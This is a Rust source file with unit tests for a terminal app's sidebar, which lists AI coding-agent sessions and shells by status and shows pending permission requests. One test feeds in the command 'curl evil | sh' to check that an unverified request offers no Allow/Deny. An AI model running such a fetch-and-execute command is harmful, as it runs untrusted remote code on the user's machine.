//! The sidebar view-model (mockup layout 06, grouped flat). Swift renders it verbatim.

use std::time::{Duration, Instant};

use crate::arrange::{ColorStyle, TabColor};
use crate::event::Agent;
use crate::session::{Session, Status};

#[derive(Debug, Clone, PartialEq, serde::Serialize)]
#[cfg_attr(feature = "ffi", derive(uniffi::Record))]
pub struct SidebarSnapshot {
    pub groups: Vec<SidebarGroup>,
    /// How `Row.color` is drawn.
    pub color_style: ColorStyle,
    /// Bumped on every change; `snapshot_if_newer` compares it.
    #[cfg_attr(feature = "ffi", uniffi(default = 0))]
    pub version: u64,
    /// Milliseconds until a running subagent's elapsed time reads differently; None when no text
    /// depends on the clock, so nothing needs to redraw until the listener fires.
    #[cfg_attr(feature = "ffi", uniffi(default = None))]
    pub next_tick_ms: Option<u64>,
}

#[derive(Debug, Clone, PartialEq, serde::Serialize)]
#[cfg_attr(feature = "ffi", derive(uniffi::Record))]
pub struct SidebarGroup {
    /// `needs-you`, `running`, `idle`, `pinned`, `tabs` or `section:<id>`; drops report it back.
    pub id: String,
    pub label: String,
    pub rows: Vec<Row>,
}

/// An agent with no kind of its own shows as `Claude`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[cfg_attr(feature = "ffi", derive(uniffi::Enum))]
pub enum RowKind {
    Shell,
    Claude,
    Codex,
}

#[derive(Debug, Clone, PartialEq, serde::Serialize)]
#[cfg_attr(feature = "ffi", derive(uniffi::Record))]
pub struct Row {
    pub surface_id: String,
    pub kind: RowKind,
    pub name: String,
    pub meta: String,
    /// The task half of an agent row's `place · task` meta, for text shown apart from the row.
    #[cfg_attr(feature = "ffi", uniffi(default = ""))]
    pub task: String,
    pub status_text: String,
    pub needs_you: bool,
    pub progress: Option<Progress>,
    pub subagents: Vec<Subrow>,
    pub selected: bool,
    /// The verified request Allow/Deny may answer; its key goes back in `answer_permission`.
    pub pending: Option<PendingRequest>,
    /// A colour the user picked for the tab, drawn as `SidebarSnapshot.color_style` says.
    pub color: Option<TabColor>,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[cfg_attr(feature = "ffi", derive(uniffi::Record))]
pub struct PendingRequest {
    pub key: u64,
    pub tool: String,
    pub preview: String,
    /// Terminal-only (`Session::terminal_only`): show it, but offer no Allow/Deny; the terminal answers.
    pub suspicious: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[cfg_attr(feature = "ffi", derive(uniffi::Record))]
pub struct Progress {
    pub done: u64,
    pub total: u64,
}

#[derive(Debug, Clone, PartialEq, serde::Serialize)]
#[cfg_attr(feature = "ffi", derive(uniffi::Record))]
pub struct Subrow {
    pub label: String,
    pub meta: String,
}

pub const NEEDS_YOU: &str = "NEEDS YOU";
pub const RUNNING: &str = "RUNNING";
pub const IDLE: &str = "IDLE";
pub const NEEDS_YOU_ID: &str = "needs-you";
pub const RUNNING_ID: &str = "running";
pub const IDLE_ID: &str = "idle";

/// What a row needs from its surface besides the session.
pub struct SurfaceView<'a> {
    pub id: &'a str,
    pub cwd: &'a str,
    pub branch: Option<&'a str>,
    pub session: &'a Session,
    pub selected: bool,
}

/// Groups rows as NEEDS YOU, RUNNING, IDLE (done, failed and shells included); empty groups are left out,
/// and a sidebar of shells alone has no label.
/// `surfaces` come in tab order; within a group the latest status change comes first.
pub fn snapshot(surfaces: &[SurfaceView], home: Option<&str>, shell: Option<&str>, now: Instant) -> SidebarSnapshot {
    let mut groups: Vec<SidebarGroup> = [(NEEDS_YOU_ID, NEEDS_YOU), (RUNNING_ID, RUNNING), (IDLE_ID, IDLE)]
        .iter()
        .map(|(id, l)| SidebarGroup { id: (*id).to_owned(), label: (*l).to_owned(), rows: vec![] })
        .collect();
    let mut order: Vec<&SurfaceView> = surfaces.iter().collect();
    // Stable, so equal times keep tab order.
    order.sort_by_key(|s| std::cmp::Reverse(s.session.status_changed));
    for s in order {
        let g = match (s.session.is_agent, s.session.status) {
            (true, Status::NeedsYou) => 0,
            (true, Status::Running) => 1,
            _ => 2,
        };
        groups[g].rows.push(row(s, home, shell, now));
    }
    groups.retain(|g| !g.rows.is_empty());
    // IDLE over plain shells says nothing until there are agents; with agents it separates the shells from them.
    if let [g] = groups.as_mut_slice()
        && g.rows.iter().all(|r| r.kind == RowKind::Shell)
    {
        g.label.clear();
    }
    SidebarSnapshot { groups, color_style: ColorStyle::Dot, version: 0, next_tick_ms: next_tick(surfaces, now) }
}

/// `precise` changes every second below an hour, every minute after.
fn next_tick(surfaces: &[SurfaceView], now: Instant) -> Option<u64> {
    surfaces
        .iter()
        .filter(|s| s.session.is_agent && matches!(s.session.status, Status::Running | Status::NeedsYou))
        .flat_map(|s| &s.session.progress.subagents)
        .filter(|a| a.duration.is_none())
        .map(|a| {
            let ms = a.elapsed(now).as_millis() as u64;
            let step = if ms < 3_600_000 { 1_000 } else { 60_000 };
            step - ms % step
        })
        .min()
}

fn row(s: &SurfaceView, home: Option<&str>, shell: Option<&str>, now: Instant) -> Row {
    let session = s.session;
    let cwd = tilde(s.cwd, home);
    let name = match cwd.trim_end_matches('/').rsplit('/').next() {
        Some("") | None => cwd.clone(),
        Some(n) => n.to_owned(),
    };
    if !session.is_agent {
        let meta = join(Some(cwd), shell.map(str::to_owned));
        return Row {
            surface_id: s.id.to_owned(),
            kind: RowKind::Shell,
            name,
            meta,
            task: String::new(),
            status_text: String::new(),
            needs_you: false,
            progress: None,
            subagents: vec![],
            selected: s.selected,
            pending: None,
            color: None,
        };
    }

    let place = s.branch.filter(|b| !b.is_empty()).map_or(cwd, str::to_owned);
    let progress = session.progress.counts(None).map(|(done, total)| Progress { done, total });
    let task = match session.status {
        Status::NeedsYou => Some(match session.live_permission() {
            Some(p) => format!("Approve: {}?", p.preview()),
            None => "Waiting for you".to_owned(),
        }),
        Status::Running => session.progress.current_task().map(str::to_owned).or_else(|| session.prompt.clone()),
        Status::Done => Some(match session.turn_started.zip(session.turn_finished) {
            Some((a, b)) => format!("Done in {}", coarse(b.saturating_duration_since(a))),
            None => "Done".to_owned(),
        }),
        Status::Failed => Some("Failed".to_owned()),
        Status::Idle => None,
    };
    let status_text = match (session.status, progress) {
        (Status::NeedsYou, _) => "needs you".to_owned(),
        (Status::Running, Some(p)) => format!("{}/{}", p.done, p.total),
        (Status::Done, _) => "done".to_owned(),
        (Status::Failed, _) => "failed".to_owned(),
        _ => String::new(),
    };
    let active = matches!(session.status, Status::Running | Status::NeedsYou);
    let subagents = if active { session.progress.subagents.iter().map(|a| subrow(session, a, now)).collect() } else { vec![] };
    Row {
        surface_id: s.id.to_owned(),
        kind: match session.agent {
            Agent::Codex => RowKind::Codex,
            _ => RowKind::Claude,
        },
        name,
        meta: join(Some(place), task.clone()),
        task: task.unwrap_or_default(),
        status_text,
        needs_you: session.status == Status::NeedsYou,
        progress,
        subagents,
        selected: s.selected,
        // An agent whose answer keys haunt doesn't know gets no Allow/Deny.
        pending: session
            .live_permission()
            .filter(|p| p.agent.answer_bytes(true).is_some())
            .map(|p| PendingRequest { key: p.key(), tool: p.tool.clone(), preview: p.preview(), suspicious: session.terminal_only(p) }),
        color: None,
    }
}

fn subrow(session: &Session, a: &crate::progress::Subagent, now: Instant) -> Subrow {
    let label = match &a.description {
        Some(d) if !d.is_empty() => format!("{} · {d}", a.kind),
        _ => a.kind.clone(),
    };
    let work = match session.progress.counts(Some(&a.id)) {
        Some((d, t)) => Some(format!("{d}/{t}")),
        None if a.tools == 1 => Some("1 tool".to_owned()),
        None if a.tools > 0 => Some(format!("{} tools", a.tools)),
        None => None,
    };
    Subrow { label, meta: join(work, Some(precise(a.elapsed(now)))) }
}

fn join(a: Option<String>, b: Option<String>) -> String {
    [a, b].into_iter().flatten().filter(|s| !s.is_empty()).collect::<Vec<_>>().join(" · ")
}

/// `~`-abbreviates a path under `home`.
pub fn tilde(path: &str, home: Option<&str>) -> String {
    match home.map(|h| h.trim_end_matches('/')).filter(|h| !h.is_empty()) {
        Some(h) if path == h => "~".to_owned(),
        Some(h) if path.strip_prefix(h).is_some_and(|r| r.starts_with('/')) => format!("~{}", &path[h.len()..]),
        _ => path.to_owned(),
    }
}

/// "48s", "1m12s", "1h5m".
pub fn precise(d: Duration) -> String {
    let s = d.as_secs();
    match s {
        0..60 => format!("{s}s"),
        60..3600 if s.is_multiple_of(60) => format!("{}m", s / 60),
        60..3600 => format!("{}m{}s", s / 60, s % 60),
        _ => format!("{}h{}m", s / 3600, s % 3600 / 60),
    }
}

/// "45s", "4m", "1h5m": whole minutes for a finished turn.
pub fn coarse(d: Duration) -> String {
    let s = d.as_secs();
    match s {
        0..60 => format!("{s}s"),
        60..3600 => format!("{}m", s / 60),
        _ => format!("{}h{}m", s / 3600, s % 3600 / 60),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{AgentEvent, parse_osc};

    fn ev(json: &str) -> AgentEvent {
        parse_osc("haunt://cli-agent", &format!(r#"{{"v":1,{}"#, &json[1..])).expect("valid event")
    }

    fn feed(s: &mut Session, events: &[&str], at: Instant) {
        for e in events {
            s.apply(&ev(e), true, at);
        }
    }

    const HOME: Option<&str> = Some("/Users/me");

    type Tab = (String, String, Option<String>, Session);

    /// The four tabs of the mockup's `TABS` array.
    fn mockup() -> (Vec<Tab>, Instant) {
        let t = Instant::now();
        let s = Duration::from_secs;

        let mut pawr = Session::new(t);
        feed(&mut pawr, &[r#"{"event":"prompt_submit","query":"write the sidebar tests"}"#], t);
        for i in 1..=5 {
            let subject = if i == 4 { "Writing tests".to_owned() } else { format!("step {i}") };
            feed(&mut pawr, &[&format!(r#"{{"event":"task_created","task_id":"{i}","task_subject":"{subject}"}}"#)], t);
        }
        for i in 1..=3 {
            feed(&mut pawr, &[&format!(r#"{{"event":"task_updated","task_id":"{i}","task_status":"completed"}}"#)], t);
        }
        feed(&mut pawr, &[r#"{"event":"task_updated","task_id":"4","task_status":"in_progress"}"#], t);
        feed(
            &mut pawr,
            &[
                r#"{"event":"subagent_spawn","agent_type":"Explore","description":"trace hooks"}"#,
                r#"{"event":"subagent_start","agent_id":"e1","agent_type":"Explore"}"#,
                r#"{"event":"todos_written","agent_id":"e1","tool_count":4,"todos_done":2}"#,
                r#"{"event":"subagent_spawn","agent_type":"builder","description":"sidebar styles"}"#,
            ],
            t,
        );
        feed(&mut pawr, &[r#"{"event":"subagent_start","agent_id":"b1","agent_type":"builder"}"#], t + s(24));
        feed(&mut pawr, &[r#"{"event":"subagent_result","agent_id":"b1","tool_count":14,"duration_ms":48000}"#], t + s(72));

        let mut orch = Session::new(t);
        feed(
            &mut orch,
            &[r#"{"event":"prompt_submit","query":"release"}"#, r#"{"event":"permission_seen","tool_name":"Bash","tool_input":{"command":"git push"}}"#],
            t + s(10),
        );

        // Shells never change status; opened last, so it sorts first as in the mockup.
        let vibes = Session::new(t + s(300));

        let mut warp = Session::new(t);
        feed(&mut warp, &[r#"{"event":"prompt_submit","query":"rebase"}"#], t);
        for i in 1..=6 {
            feed(&mut warp, &[&format!(r#"{{"event":"task_updated","task_id":"{i}","task_status":"completed"}}"#)], t);
        }
        feed(&mut warp, &[r#"{"event":"stop"}"#], t + s(4 * 60 + 20));

        let surfaces = vec![
            ("pawr".to_owned(), "/Users/me/code/pawr".to_owned(), Some("agent-sidebar".to_owned()), pawr),
            ("orchestrator".to_owned(), "/Users/me/code/orchestrator".to_owned(), Some("main".to_owned()), orch),
            ("vibes".to_owned(), "/Users/me/code/vibes".to_owned(), None, vibes),
            ("warp".to_owned(), "/Users/me/code/warp upstream".to_owned(), Some("master".to_owned()), warp),
        ];
        (surfaces, t + s(72))
    }

    fn render(surfaces: &[Tab], now: Instant) -> SidebarSnapshot {
        let views: Vec<SurfaceView> = surfaces
            .iter()
            .map(|(id, cwd, b, s)| SurfaceView { id, cwd, branch: b.as_deref(), session: s, selected: id == "pawr" })
            .collect();
        snapshot(&views, HOME, Some("zsh"), now)
    }

    #[test]
    fn the_next_tick_is_when_a_running_subagent_clock_changes() {
        let (mut surfaces, now) = mockup();
        let ms = Duration::from_millis;
        assert_eq!(render(&surfaces, now + ms(300)).next_tick_ms, Some(700));
        assert_eq!(render(&surfaces, now + ms(3_600_000 - 72_000 + 250)).next_tick_ms, Some(59_750));
        feed(&mut surfaces[0].3, &[r#"{"event":"subagent_stop","agent_id":"e1"}"#], now);
        assert_eq!(render(&surfaces, now).next_tick_ms, None, "finished subagents show a fixed duration");
    }

    #[test]
    fn groups_and_rows_match_mockup_06() {
        let (surfaces, now) = mockup();
        let snap = render(&surfaces, now);
        let labels: Vec<_> = snap.groups.iter().map(|g| g.label.as_str()).collect();
        assert_eq!(labels, ["NEEDS YOU", "RUNNING", "IDLE"]);

        let orch = &snap.groups[0].rows[0];
        assert_eq!((orch.kind, orch.name.as_str()), (RowKind::Claude, "orchestrator"));
        assert_eq!(orch.meta, "main · Approve: git push?");
        assert_eq!(orch.task, "Approve: git push?");
        assert_eq!(orch.status_text, "needs you");
        assert!(orch.needs_you && !orch.selected);

        let pawr = &snap.groups[1].rows[0];
        assert_eq!(pawr.name, "pawr");
        assert_eq!(pawr.meta, "agent-sidebar · Writing tests");
        assert_eq!(pawr.task, "Writing tests");
        assert_eq!(pawr.status_text, "3/5");
        assert_eq!(pawr.progress, Some(Progress { done: 3, total: 5 }));
        assert!(pawr.selected);
        assert_eq!(
            pawr.subagents,
            [
                Subrow { label: "Explore · trace hooks".into(), meta: "2/4 · 1m12s".into() },
                Subrow { label: "builder · sidebar styles".into(), meta: "14 tools · 48s".into() },
            ]
        );

        let idle: Vec<_> = snap.groups[2].rows.iter().map(|r| (r.kind, r.name.as_str(), r.meta.as_str(), r.status_text.as_str())).collect();
        assert_eq!(
            idle,
            [(RowKind::Shell, "vibes", "~/code/vibes · zsh", ""), (RowKind::Claude, "warp upstream", "master · Done in 4m", "done")]
        );
        let warp = &snap.groups[2].rows[1];
        assert_eq!(warp.progress, Some(Progress { done: 6, total: 6 }));
        assert!(warp.subagents.is_empty());
    }

    #[test]
    fn empty_groups_are_left_out() {
        let t = Instant::now();
        let shell = Session::new(t);
        let views = [SurfaceView { id: "a", cwd: "/Users/me", branch: None, session: &shell, selected: false }];
        let snap = snapshot(&views, HOME, Some("zsh"), t);
        assert_eq!(snap.groups.len(), 1);
        assert_eq!(snap.groups[0].label, "", "shells alone get no IDLE label");
        assert_eq!((snap.groups[0].rows[0].name.as_str(), snap.groups[0].rows[0].meta.as_str()), ("~", "~ · zsh"));
    }

    #[test]
    fn shells_keep_the_idle_label_when_agents_are_listed() {
        let t = Instant::now();
        let shell = Session::new(t);
        let mut agent = Session::new(t);
        agent.apply(&ev(r#"{"event":"permission_seen","tool_name":"Bash","tool_input":{"command":"git push"}}"#), true, t);
        let views = [
            SurfaceView { id: "a", cwd: "/a", branch: None, session: &agent, selected: false },
            SurfaceView { id: "b", cwd: "/b", branch: None, session: &shell, selected: false },
        ];
        let snap = snapshot(&views, HOME, Some("zsh"), t);
        let groups: Vec<_> = snap.groups.iter().map(|g| (g.label.as_str(), g.rows.len())).collect();
        assert_eq!(groups, [("NEEDS YOU", 1), ("IDLE", 1)], "the shell must not read as needing you");
    }

    #[test]
    fn shell_meta_is_cwd_and_shell_never_branch() {
        let t = Instant::now();
        let shell = Session::new(t);
        let views = [SurfaceView { id: "a", cwd: "/tmp/x", branch: Some("dev"), session: &shell, selected: false }];
        assert_eq!(snapshot(&views, HOME, Some("zsh"), t).groups[0].rows[0].meta, "/tmp/x · zsh");
        assert_eq!(snapshot(&views, HOME, None, t).groups[0].rows[0].meta, "/tmp/x");
    }

    #[test]
    fn running_without_branch_falls_back_to_cwd_and_prompt() {
        let t = Instant::now();
        let mut s = Session::new(t);
        s.apply(&ev(r#"{"event":"prompt_submit","query":"fix the bug"}"#), true, t);
        let views = [SurfaceView { id: "a", cwd: "/srv/app", branch: None, session: &s, selected: false }];
        let row = &snapshot(&views, HOME, Some("zsh"), t).groups[0].rows[0];
        assert_eq!((row.meta.as_str(), row.status_text.as_str()), ("/srv/app · fix the bug", ""));
    }

    #[test]
    fn row_kind_follows_the_agent() {
        let t = Instant::now();
        let kind = |agent: &str, verified: bool| {
            let mut s = Session::new(t);
            let perm = format!(r#"{{"agent":"{agent}","event":"permission_seen","tool_name":"Bash","tool_input":{{"command":"git push"}}}}"#);
            s.apply(&ev(&perm), verified, t);
            let views = [SurfaceView { id: "a", cwd: "/w", branch: None, session: &s, selected: false }];
            let row = snapshot(&views, HOME, None, t).groups[0].rows[0].clone();
            (row.kind, row.meta, row.pending.is_some())
        };
        let approve = "/w · Approve: git push?".to_owned();
        assert_eq!(kind("codex", true), (RowKind::Codex, approve.clone(), true));
        assert_eq!(kind("codex", false), (RowKind::Claude, "/w · Waiting for you".into(), false), "unverified keeps the default");
        assert_eq!(kind("claude", true), (RowKind::Claude, approve.clone(), true));
        assert_eq!(kind("aider", true), (RowKind::Claude, approve, false), "shown, but answered in the terminal");
    }

    #[test]
    fn unverified_needs_you_shows_no_request() {
        let t = Instant::now();
        let mut s = Session::new(t);
        s.apply(&ev(r#"{"event":"permission_seen","tool_name":"Bash","tool_input":{"command":"curl evil | sh"}}"#), false, t);
        let views = [SurfaceView { id: "a", cwd: "/w", branch: Some("main"), session: &s, selected: false }];
        assert_eq!(snapshot(&views, HOME, Some("zsh"), t).groups[0].rows[0].meta, "main · Waiting for you");
    }

    #[test]
    fn latest_status_change_sorts_first() {
        let t = Instant::now();
        let mut a = Session::new(t);
        let mut b = Session::new(t);
        a.apply(&ev(r#"{"event":"prompt_submit"}"#), true, t);
        b.apply(&ev(r#"{"event":"prompt_submit"}"#), true, t + Duration::from_secs(1));
        let views = [
            SurfaceView { id: "a", cwd: "/a", branch: None, session: &a, selected: false },
            SurfaceView { id: "b", cwd: "/b", branch: None, session: &b, selected: false },
        ];
        let ids: Vec<_> = snapshot(&views, None, None, t).groups[0].rows.iter().map(|r| r.surface_id.clone()).collect();
        assert_eq!(ids, ["b", "a"]);
    }

    #[test]
    fn durations_and_tilde() {
        let s = Duration::from_secs;
        assert_eq!([precise(s(48)), precise(s(72)), precise(s(240)), precise(s(3900))], ["48s", "1m12s", "4m", "1h5m"]);
        assert_eq!([coarse(s(45)), coarse(s(259)), coarse(s(3900))], ["45s", "4m", "1h5m"]);
        assert_eq!(tilde("/Users/me/code", HOME), "~/code");
        assert_eq!(tilde("/Users/meow", HOME), "/Users/meow");
        assert_eq!(tilde("/Users/me", Some("/Users/me/")), "~");
    }
}
